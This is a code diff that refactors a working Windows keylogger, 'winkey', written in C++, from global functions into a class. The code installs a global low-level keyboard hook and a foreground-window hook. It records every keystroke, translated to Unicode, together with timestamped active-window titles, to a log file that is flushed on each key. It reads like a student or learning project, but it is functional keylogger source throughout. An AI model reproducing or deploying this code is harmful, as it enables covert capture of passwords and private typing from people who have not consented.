@@ -1,10 +1,55 @@
 #include "winkey.hpp"
 
-std::wofstream  g_logFile;
+std::wofstream	Winkey::_logFile;
+
+Winkey::Winkey(): _logFileName(TW_LOGFILE) {
+    // Prevent multiple instances of this program
+    _singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
+    if (GetLastError() == ERROR_ALREADY_EXISTS)
+        throw InstanceAlreadyRunnningException();
+
+    // Open the outfile in appending mode
+    _logFile.open(TW_LOGFILE, std::ios::app);
+    if (!_logFile.is_open())
+        throw FileOpenFailureException();
+
+    // Set window and keyboard hooks
+    try { setHooks(); } catch (HookSettingFailureException &e) {
+        throw std::runtime_error(e.what());
+    }
+}
+
+void Winkey::setHooks() {
+    // Set the event hook for foreground window changes (out-of-context)
+    _winEventHook = SetWinEventHook(
+        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
+        NULL,
+        WinEventProc,
+        0, 0,
+        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
+    );
+    if (!_winEventHook) throw HookSettingFailureException();
+
+    // Install global low-level keyboard hook to intercept keystrokes
+    _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    if (!_keyboardHook) throw HookSettingFailureException();
+}
+
+void Winkey::run() {
+    /*
+     * Main message loop
+     * Blocks until a Windows message (like an event) is available.
+     */
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {}
+}
 
 // Write the timestamp + current active window name to the log file
-void CALLBACK WinEventProc(HWINEVENTHOOK /*hWinEventHook*/, DWORD event, HWND hwnd,
-    LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/)
+void CALLBACK Winkey::WinEventProc(
+    const HWINEVENTHOOK /*hWinEventHook*/, const DWORD event, const HWND hwnd,
+    LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
+)
 {
     static HWND lastWindow = nullptr;
 
@@ -24,8 +69,8 @@ void CALLBACK WinEventProc(HWINEVENTHOOK /*hWinEventHook*/, DWORD event, HWND hw
             if (localtime_s(&localTime, &now) == 0) {
                 // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
                 // `L` is for wide characters (Unicode)
-                g_logFile << std::endl; // Force new line before the entry
-                g_logFile << L"[" << std::setfill(L'0')
+                _logFile << std::endl; // Force new line before the entry
+                _logFile << L"[" << std::setfill(L'0')
                         << std::setw(2) << localTime.tm_mday << L"."
                         << std::setw(2) << (localTime.tm_mon + 1) << L"."
                         << (localTime.tm_year + 1900) << L" "
@@ -36,58 +81,59 @@ void CALLBACK WinEventProc(HWINEVENTHOOK /*hWinEventHook*/, DWORD event, HWND hw
             }
         }
     }
-    return;
 }
 
 /*
- * Low-level keyboard hook callback.
- *
- * @param   nCode   Code the system passes to the hook procedure to indicate
- *                  the action to be taken.
- * @param   wParam  The message type.
- * @param   lParam  Points to a KBDLLHOOKSTRUCT structure that contains detailed
- *                  information about the keyboard event (which key, scan code,
- *                  flags, etc.).
- * 
- * @return  CallNextHookEx
- *          - LRESULT is a Windows data type used for return values from
- *              window procedures and hook functions.
- *          - CALLBACK is a macro defining the calling convention of the function
- *              (specifies how parameters are passed and who cleans the stack).
- */
+* Low-level keyboard hook callback.
+*
+* @param   nCode   Code the system passes to the hook procedure to indicate
+*                  the action to be taken.
+* @param   wParam  The message type.
+* @param   lParam  Points to a KBDLLHOOKSTRUCT structure that contains detailed
+*                  information about the keyboard event (which key, scan code,
+*                  flags, etc.).
+* 
+* @return  CallNextHookEx
+*          - LRESULT is a Windows data type used for return values from
+*              window procedures and hook functions.
+*          - CALLBACK is a macro defining the calling convention of the function
+*              (specifies how parameters are passed and who cleans the stack).
+*/
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK Winkey::LowLevelKeyboardProc(
+    const int nCode, const WPARAM wParam, const LPARAM lParam
+)
 {
     /*
-     * HC_ACTION        Process the event normally.
-     * WM_KEYDOWN       Key pressed
-     * WM_SYSKEYDOWN    System key pressed (like ALT)
-     */
+    * HC_ACTION        Process the event normally.
+    * WM_KEYDOWN       Key pressed
+    * WM_SYSKEYDOWN    System key pressed (like ALT)
+    */
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
     {
-        KBDLLHOOKSTRUCT*    p = (KBDLLHOOKSTRUCT*)lParam;
-        BYTE                keyboardState[256];
-        WCHAR               buffer[5] = {};
+        const KBDLLHOOKSTRUCT*  p = (KBDLLHOOKSTRUCT*)lParam;
+        BYTE                    keyboardState[256];
+        WCHAR                   buffer[5] = {};
 
         // Get the current state of all keys
         GetKeyboardState(keyboardState);
         // Gets the input language layout of the current thread
-        HKL layout = GetKeyboardLayout(0);
+        const HKL layout = GetKeyboardLayout(0);
         
         /*
-         * Converts the virtual key code (vkCode) and scan code into the
-         *  corresponding Unicode character(s)
-         * 
-         * vkCode:
-         *  - A Windows-defined constant that identifies a logical key,
-         *      like "A", "Shift", "Enter", "F1", etc.
-         *  - Same across keyboards: for example, VK_A always refers to the A key,
-         *      no matter where it is on the keyboard.
-         * 
-         * scanCode:
-         *  - A hardware-generated code from the keyboard itself.
-         *  - Represents the physical location of the key on the keyboard.
-         */
+        * Converts the virtual key code (vkCode) and scan code into the
+        *  corresponding Unicode character(s)
+        * 
+        * vkCode:
+        *  - A Windows-defined constant that identifies a logical key,
+        *      like "A", "Shift", "Enter", "F1", etc.
+        *  - Same across keyboards: for example, VK_A always refers to the A key,
+        *      no matter where it is on the keyboard.
+        * 
+        * scanCode:
+        *  - A hardware-generated code from the keyboard itself.
+        *  - Represents the physical location of the key on the keyboard.
+        */
 
         int result = ToUnicodeEx(
             p->vkCode, p->scanCode, keyboardState, buffer, 4, 0, layout
@@ -95,14 +141,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         buffer[result] = L'\0'; // Null-terminate
 
         /* Log character to file or, if no valid character was produced
-         *  (like arrow keys, function keys), log a fallback string that includes
-         *  the virtual key code.
-         */
-        if (result > 0) g_logFile << buffer;
-        else g_logFile << GetKeyName(p->vkCode);
+        *  (like arrow keys, function keys), log a fallback string that includes
+        *  the virtual key code.
+        */
+        if (result > 0) _logFile << buffer;
+        else _logFile << GetKeyName(p->vkCode);
 
         // Ensure that everything written to the file is immediately pushed to disk
-        g_logFile.flush();
+        _logFile.flush();
     }
 
     // Pass the event to the next hook
@@ -110,56 +156,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-int main(void)
-{
-    // Prevent multiple instances of this program
-    HANDLE  singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
-    if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        std::cerr << "Already running" << std::endl;
-        return 1;
-    }
+Winkey::~Winkey() {
+    if (_winEventHook)          UnhookWinEvent(_winEventHook);
+    if (_keyboardHook)          UnhookWindowsHookEx(_keyboardHook);
+    if (_singleInstanceMutex)   CloseHandle(_singleInstanceMutex);
+    if (_logFile.is_open())     _logFile.close();
+}
 
-    // Open the outfile in appending mode
-    g_logFile.open(TW_LOGFILE, std::ios::app);
-    if (!g_logFile.is_open()) {
-        std::cerr << "Failed to open log file." << std::endl;
-        //TODO clean quit
-        return 1;
-    }
-
-    // Set the event hook for foreground window changes (out-of-context)
-    HWINEVENTHOOK winEventHook = SetWinEventHook(
-        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
-        NULL,
-        WinEventProc,
-        0, 0,
-        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
-    );
-    if (!winEventHook) {
-        std::cerr << "Failed to set window event hook." << std::endl;
-        return 1;
-    }
-
-    // Install global low-level keyboard hook to intercept keystrokes
-    HHOOK   keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
-    if (!keyboardHook) {
-        std::cerr << "Failed to set keyboard hook." << std::endl;
-        return 1;
-    }
-
-    /*
-     * Main message loop
-     * Blocks until a Windows message (like an event) is available.
-     */
-
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {}
-
-    // Cleanup
-    UnhookWinEvent(winEventHook);
-    UnhookWindowsHookEx(keyboardHook);
-    CloseHandle(singleInstanceMutex);
-    g_logFile.close();
-
-    return 0;
+int main() {
+    Winkey w;
+    w.run();
 }
